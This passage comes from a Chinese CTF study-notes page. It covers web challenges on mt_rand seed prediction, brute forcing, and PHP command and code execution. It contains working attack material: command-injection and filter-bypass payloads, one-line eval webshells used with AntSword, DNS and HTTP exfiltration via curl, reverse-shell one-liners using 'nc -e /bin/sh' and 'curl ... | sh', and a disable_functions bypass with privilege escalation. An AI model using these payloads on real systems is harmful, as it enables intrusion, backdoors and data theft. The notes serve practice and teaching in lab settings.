class="hljs-built_in">print</span>(b)<br><br></code></pre></td></tr></table></figure><h4 id="web24">web24</h4><p>随机数种子固定，随机数也随之固定，输出该随机数即可：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">372619038</span>);<br>    <span class="hljs-variable">$num</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-title function_ invoke__">mt_rand</span>());<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$num</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="web25">web25</h4><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$r</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$flag</span>), <span class="hljs-number">0</span>,<span class="hljs-number">8</span>)));<br>    <span class="hljs-variable">$rand</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$r</span>)-<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-title function_ invoke__">mt_rand</span>());<br>    <span class="hljs-keyword">if</span>((!<span class="hljs-variable">$rand</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;token&#x27;</span>]==(<span class="hljs-title function_ invoke__">mt_rand</span>()+<span class="hljs-title function_ invoke__">mt_rand</span>()))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$rand</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /proc/version&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>分析：</p><p>本题没有给出随机数的种子，但可以构造?r=0，通过输出rand来得到第一个随机数；</p><p>使用逆推工具得到随机数，得到第二个和第三个随机数相加的结果构造cookie。</p><p>首先得到网站php版本：</p><figure><img src="/2024/12/03/Web/1733230172791.png" alt="1733230172791"><figcaption aria-hidden="true">1733230172791</figcaption></figure><p>根据结果尝试随机数种子：1254074886和2714868377</p><figure><img src="/2024/12/03/Web/1733230194519.png" alt="1733230194519"><figcaption aria-hidden="true">1733230194519</figcaption></figure><p>脚本尝试：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">1254074886</span>);<br>    <span class="hljs-title function_ invoke__">mt_rand</span>();<br>    <span class="hljs-variable">$num</span> = <span class="hljs-title function_ invoke__">mt_rand</span>()+<span class="hljs-title function_ invoke__">mt_rand</span>();<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$num</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>构造即可：</p><figure><img src="/2024/12/03/Web/1733230215321.png" alt="1733230215321"><figcaption aria-hidden="true">1733230215321</figcaption></figure><h4 id="web26">web26</h4><p>本题可能是爆破pass,但这里默认的值即可连接成功，传入空看响应结果得到flag</p><p>抓包，数据库连接成功的响应包</p><figure><img src="/2024/12/03/Web/1733230237363.png" alt="1733230237363"><figcaption aria-hidden="true">1733230237363</figcaption></figure><h4 id="web27">web27</h4><p>爆破身份证日期，payload设置如下：</p><figure><img src="/2024/12/03/Web/1733230253292.png" alt="1733230253292"><figcaption aria-hidden="true">1733230253292</figcaption></figure><p>得到提示信息msg，unicode编码，登录即可</p><h4 id="web28">web28</h4><p>目录格式奇怪，爆破目录，忘了截图，payload设置如下：</p><p>/？？/？？</p><h2 id="php的代码执行rce">php的代码执行（RCE）</h2><h3 id="php基础知识">php基础知识</h3><h4 id="get包转post包">GET包转POST包</h4><p>bp中get转post，使用<code>change</code>快捷键</p><p>修改三处：GET-&gt;POST，增加Content-Type，Content-Length</p><h4 id="php自定义函数">php自定义函数</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$a</span>+<span class="hljs-variable">$b</span>;<br>    &#125;<br>    <span class="hljs-variable">$a</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>    <span class="hljs-variable">$b</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">add</span>(<span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="php的命令执行执行操作系统的命令">php的命令执行(执行操作系统的命令)</h3><h4 id="可以执行系统命令的函数">可以执行系统命令的函数</h4><ul><li>system[相当于cmd，只能执行系统命令，不能执行phpinfo();]</li><li>passthru</li><li>exec</li><li>shell_exec</li><li>popen</li><li>pcntl_exec</li><li>执行运算符`，底层执行（shell_exec）</li></ul><p>windows下可以执行的命令：calc,bat,vbs等</p><p>linux下可以执行的命令：cat,cp,nc,whoami等</p><h4 id="几种类型">几种类型</h4><p>例如：ping -c 1 www.baidu.com</p><ul><li>命令可控 例如ping</li><li>参数可控 -c可控</li><li>参数值可控 1和www.baidu.com可控</li><li>整体可控，但要突破过滤</li></ul><h4 id="参数值可控">参数值可控</h4><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$dir</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;dir&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ls&quot;</span>.<span class="hljs-variable">$dir</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>此时默认回显当前工作目录中的所有文件和子目录，flag.php、index.php</p><p>解题：多命令的执行：<code>dir=;cat flag.php</code>或者<code>dir=&amp;&amp;cat flag.php</code></p><p>由于浏览器不认识<code>&lt;?php</code>标记，需要去源代码界面查看flag.php文件，可以将<code>cat</code>修改为<code>tac</code>从最后一行开始读。</p><ul><li>&amp;&amp;（需要进行URL编码） 前后两个命令并列执行</li><li>|| （需要进行URL编码）前后两个命令有一个执行成功即可，存在短路</li><li>； 独立的两条命令执行</li></ul><h4 id="命令可控">命令可控</h4><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;dir&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>命令解释：<code>&gt;/dev/null 2&gt;&amp;1</code></p><p>命令重定向操作，同时丢弃标准输出和标准错误，不会有任何回显。</p><ul><li><strong>&gt;</strong>：这是输出重定向操作符。它将标准输出（stdout）重定向到指定的位置。</li><li><strong>/dev/null</strong>：这是一个特殊的文件，通常被称为“黑洞”。任何写入这个文件的数据都会被丢弃。将输出重定向到<code>/dev/null</code> 意味着放弃该输出。</li><li>1 表示stdout标准输出，系统默认值是1，所以"&gt;/dev/null"等同于“1&gt;/dev/null”</li><li><strong>2&gt;&amp;1</strong>：这是将标准错误（stderr，文件描述符2）重定向到标准输出（stdout，文件描述符1）的操作。<strong><code>2</code>表示标准错误，<code>1</code>表示标准输出</strong>。<code>&gt;&amp;</code>表示将一个文件描述符的输出重定向到另一个文件描述符。由于标准输出已经被重定向到<code>/dev/null</code>，因此标准错误也会被重定向到同样的地方，最终也被丢弃。</li></ul><p>解题：使用<code>;</code> <code>||</code> <code>&amp;&amp;</code>进行命令分隔即可。</p><h4 id="整体可控">整体可控</h4><h5 id="黑名单过滤">黑名单过滤</h5><ul><li>替换过滤：把敏感关键字替换为<strong>空</strong></li></ul><p>策略：双写绕过，例如<code>ccatat</code>，替换后正好变成<code>cat</code>。</p><ul><li>过滤特定字符串：过滤flag等关键字</li></ul><p>策略：使用通配符（<code>*</code><code>?</code>）绕过，其中<code>*</code>表示任意长度字符，<code>？</code>表示一个字符。</p><p>常见命令，批量移动文件，使用命令：<code>mv *.txt ./tmp</code></p><h6 id="通配符">通配符</h6><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|\&amp;|\;/i&quot;</span>,<span class="hljs-variable">$cmd</span>))  <span class="hljs-comment">//！preg_match()表示没有匹配到</span><br>    &#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>.<span class="hljs-string">&quot;&gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ul><li>preg_match(rules,string) : 前面为匹配规则，后面为要匹配的字符串</li><li>规则详谈：主要是3部分<code>/flag</code> <code>\&amp;</code><code>\;</code>，中间使用<code>|</code>表示或的关系，<code>/i</code>是一种模式，表示不区分大小写；</li><li><code>/flag</code>：表示<strong>部分匹配</strong>flag字符串（包括myflag,flagggg等）；完全匹配的格式<code>/^flag$</code>(不包括myflag...)</li><li><code>\&amp;</code>：表示部分匹配&amp;符号，由于&amp;是一个特殊字符，所以需要加</li><li><code>\;</code>同上</li></ul><p>解题：使用通配符绕过即可。</p><h6 id="更多命令执行和base64编码">更多命令，``执行和base64编码</h6><p>过滤<code>cat</code> <code>more</code>等文件读取命令：</p><p>解法一：（更多命令）tac nl od等</p><ul><li><p>cat example.txt</p></li><li><p>tac example.txt</p></li><li><p>moreexample.txt：分页显示文件内容，space翻页，enter向下滚动一行，b向上翻页，q退出</p></li><li><p>nl example.txt ：显示文件内容，同时在每一行前加上行号</p></li><li><p>od -c example.txt ：以字符形式显示</p><p>od -x example.txt ：以十六进制形式显示</p><p>od -d example.txt ：以十进制形式显示</p></li></ul><p>解法二：利用``可执行命令进行命令组合执行</p><figure><img src="/2024/12/03/Web/1733115011030.png" alt="1733115011030"><figcaption aria-hidden="true">1733115011030</figcaption></figure><p>可利用编码解码进行绕过echo 'base64_en(cat flag.php)'|base64-d（外加``）</p><h6 id="变量拼接过滤关键字">变量拼接过滤关键字</h6><p>cat flag.php 等价：</p><p><code>cmd = a=c;b=at;c=fla;d=g.php;$a$b $&#123;c&#125;$&#123;d&#125;</code></p><p>这里花括号用来明确变量边界</p><p>eval()里好像不能进行拼接？？？</p><h5 id="符号过滤">符号过滤</h5><h6 id="空格过滤">空格过滤</h6><ol type="1"><li><strong>读文件</strong>，用&lt;&gt;代替空格</li><li>使用<code>$&#123;IFS&#125;</code>或者<code>$IFS$9</code>来代替空格，bash下甚至可用{cmd,args}来代替空格</li><li>控制字符代替空格（<code>%09</code> <code>%0b</code><code>%0c</code>） -&gt; 过滤 </li><li>字符串截取空格：</li></ol><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#功能介绍</span><br><span class="hljs-attribute">cmd</span>=aabbcc<br><span class="hljs-variable">$&#123;cmd&#125;</span><br><span class="hljs-comment">#输出aabbcc</span><br><br><span class="hljs-variable">$&#123;cmd:2&#125;</span><br><span class="hljs-comment">#输出bbcc</span><br><br><span class="hljs-variable">$&#123;cmd:4:1&#125;</span><br><span class="hljs-comment">#输出c</span><br></code></pre></td></tr></table></figure><p>从环境变量<code>cmd=env</code>截取空格，环境变量开头为<code>环境变量名=</code>，利用<code>$&#123;环境变量名&#125;</code>使用</p><h4 id="无回显命令执行shell_exec">无回显命令执行shell_exec()</h4><h5 id="写通道">写通道</h5><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">url/?<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">ls</span> &gt; 1.txt</span><br>访问：<br>url/<span class="hljs-number">1</span>.txt<br></code></pre></td></tr></table></figure><h5 id="dns通道">DNS通道</h5><p>一些网站可获取dnslog信息</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">url/?cmd=ping -c <span class="hljs-number">1</span> `whoami`.xx.xx(获取的二级域名)<br></code></pre></td></tr></table></figure><p>可能出现行数有限的情况；可以分段获取信息：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">url/?<span class="hljs-attribute">cmd</span>=a=`sed -n <span class="hljs-string">&quot;3,4p&quot;</span> 1.txt`;curl <span class="hljs-variable">$&#123;a:0:10 |base64&#125;</span>.xx.xx;<br></code></pre></td></tr></table></figure><ul><li>首先是<code>sed -n "3,4p" 1.txt</code> :</li></ul><p>sed：是一个流编辑器，用于对文本进行处理和转换。</p><p>-n：告诉 sed 不要自动打印每一行的输出。默认情况下，sed会打印所有处理过的行，使用 -n 选项后，只有明确指定的行才会被打印。</p><p>3,4：指定要处理的行范围，从第 3 行到第 4 行。p：表示打印匹配到的行。</p><p>1.txt：是要处理的输入文件名。 结合起来，这条命令的作用是从文件 1.txt中提取并打印出第 3 行和第 4 行的内容。</p><ul><li><code>curl</code>命令，模拟向服务器发送请求</li><li>可进行base64编码</li></ul><h5 id="http信道">http信道</h5><p>向requestrepo.com网站发送request请求，在参数里解析命令</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">curl <span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/xx.requestrepo.com/</span><span class="hljs-string">?1</span>=<span class="hljs-string">``</span>;<br></code></pre></td></tr></table></figure><p>利用GET解析命令。</p><p>现在访问好像获取不了子域名，等待尝试。</p><h5 id="反弹shell信道">反弹shell信道</h5><p>（需要有公网IP）</p><ol type="1"><li>借助your-shell.com:</li></ol><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">curl https://your-<span class="hljs-keyword">shell</span>.<span class="hljs-keyword">com</span>/yourip:port_num | <span class="hljs-keyword">sh</span><br>监听端监听对应端口:<br>nc -lvp port_num<br></code></pre></td></tr></table></figure><ol start="2" type="1"><li>直接输入命令：</li></ol><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elm">攻击端：<br><span class="hljs-title">nc</span> <span class="hljs-type">IP</span> port_num -e /bin/sh<br>监听端：<br><span class="hljs-title">nc</span> -lvp port_num<br></code></pre></td></tr></table></figure><h5 id="延时信道">延时信道</h5><p>可用于验证命令是否成功执行</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">？<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">sleep</span> 3</span><br></code></pre></td></tr></table></figure><h4 id="绕过总结">绕过总结</h4><ol type="1"><li>双写绕过</li><li>通配符绕过？ *</li><li>命令替换</li><li>整体编码</li><li>拼接关键字</li><li>符号过滤：空格（1. 文件：&lt;&gt; 2. ${IFS} 3. 控制字符：%09 4.环境变量截取 ）</li></ol><h3 id="php的代码执行执行php代码">php的代码执行（执行php代码）</h3><h4 id="可以执行php代码的函数">可以执行php代码的函数</h4><p>eval() :把一串字符当作php代码执行，可以转为命令执行<code>code=system('')</code></p><p>call_user_func()：把第一个参数作为回调函数调用，代码举例如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">increment</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$var</span>++;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-number">0</span>;<br><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-string">&#x27;increment&#x27;</span>, <span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-string">&#x27;increment&#x27;</span>, <span class="hljs-keyword">array</span>(&amp;<span class="hljs-variable">$a</span>)); <span class="hljs-comment">// You can use this instead before PHP 5.3</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-meta">?&gt;</span> <br>    <br><span class="hljs-comment">//输出0</span><br><span class="hljs-comment">//输出1</span><br></code></pre></td></tr></table></figure><p>call_user_func_array()：调用回调函数，并把一个数组参数作为回调函数的参数，代码实例如下：(简单理解为传递多个参数)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">foobar</span>(<span class="hljs-params"><span class="hljs-variable">$arg</span>, <span class="hljs-variable">$arg2</span></span>) </span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-keyword">__FUNCTION__</span>, <span class="hljs-string">&quot; got <span class="hljs-subst">$arg</span> and <span class="hljs-subst">$arg2</span>\n&quot;</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">foo</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bar</span>(<span class="hljs-params"><span class="hljs-variable">$arg</span>, <span class="hljs-variable">$arg2</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">__METHOD__</span>, <span class="hljs-string">&quot; got <span class="hljs-subst">$arg</span> and <span class="hljs-subst">$arg2</span>\n&quot;</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-comment">// Call the foobar() function with 2 arguments</span><br><span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-string">&quot;foobar&quot;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;one&quot;</span>, <span class="hljs-string">&quot;two&quot;</span>));<br><br><span class="hljs-comment">// Call the $foo-&gt;bar() method with 2 arguments</span><br><span class="hljs-variable">$foo</span> = <span class="hljs-keyword">new</span> foo;<br><span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$foo</span>, <span class="hljs-string">&quot;bar&quot;</span>), <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;three&quot;</span>, <span class="hljs-string">&quot;four&quot;</span>));<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h4 id="eval函数">eval()函数</h4><p>一句话木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//使用蚁剑连接，密码为参数名字`cmd`</span><br>    <br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//转接头，蚁剑连接url: xx/?cmd=eval($_POST[&#x27;1&#x27;])</span><br><span class="hljs-comment">//连接密码为1</span><br></code></pre></td></tr></table></figure><h4 id="call_user_fun函数">call_user_fun()函数</h4><p>第一个参数为回调函数（注意eval、echo不属于函数）；</p><p>eval()可以替换为assert()，在<code>php5</code>中assert()是函数，且与eval()功能相同</p><h4 id="其他函数-查手册">其他函数-查手册</h4><p>array_walk_recursive()： 对数组中的每个成员递归地应用用户函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">bool</span> <span class="hljs-title function_ invoke__">array_walk_recursive</span>( <span class="hljs-keyword">array</span> &amp;<span class="hljs-variable">$array</span>, <span class="hljs-keyword">callable</span> <span class="hljs-variable">$callback</span>)<br></code></pre></td></tr></table></figure><p>前面为参数，后面为函数。</p><p><strong>GET传参（数组）：</strong></p><p>例如：$_GET['a']，传入[1,2,3]</p><p><code>url/?a[]=1&amp;a[]=2&amp;a[]=3</code></p><h4 id="过滤但需要php标记">过滤？但需要php标记</h4><p>使用另一个php标记，这里<code>&lt;/script&gt;</code>表示一个<code>;</code>：（在php语法中，结束标记等于一个；）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;script language=<span class="hljs-string">&quot;php&quot;</span>&gt;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;some editors (like FrontPage) don\&#x27;t</span><br><span class="hljs-string">              like processing instructions&#x27;</span>;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><h4 id="限制命令长度">限制命令长度</h4><ol type="1"><li>php标记压缩：<code>&lt;?= ?&gt;</code> <code>&lt;?=  ;&gt;</code><code>&lt;?   ;</code></li><li>构造payload:</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span>`<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]`&amp;<span class="hljs-number">1</span>=sleep3;<br></code></pre></td></tr></table></figure><ol start="3" type="1"><li>该payload无回显，参考无回显的命令执行</li></ol><h4 id="蚁剑用法探索">蚁剑用法探索</h4><p>题目描述，过滤eval,request,include，phpinfo()表明配置中还禁止了一些系统执行函数</p><ol type="1"><li>替换为assert()函数，且使用base64编码</li><li>遇到虚拟终端无回显：插件<code>disable_function</code>多模式尝试</li></ol><ul><li>LD_PRELOAD：执行成功会生成xxproxy.php，通过访问该文件进行提权url/proxy.php/?1=，传参与第一步相同</li><li>若遇到权限不足，使用插件<code>搜索rwd目录及suid文件</code>，查找有sudo权限的命令</li></ul><h4 id="无字母数字的代码执行">无字母数字的代码执行</h4><p>利用异或，取反，自增，或等操作将非字母数字符号进行运算构造出字母或者数字（对应脚本）</p><h2 id="练习-1">练习</h2><h3 id="过滤">过滤</h3><h4 id="web29">web29</h4><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>通配符即可.</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">url/?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;tac fla*&#x27;</span>);<br></code></pre></td></tr></table></figure><h4 id="web30">web30</h4><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ 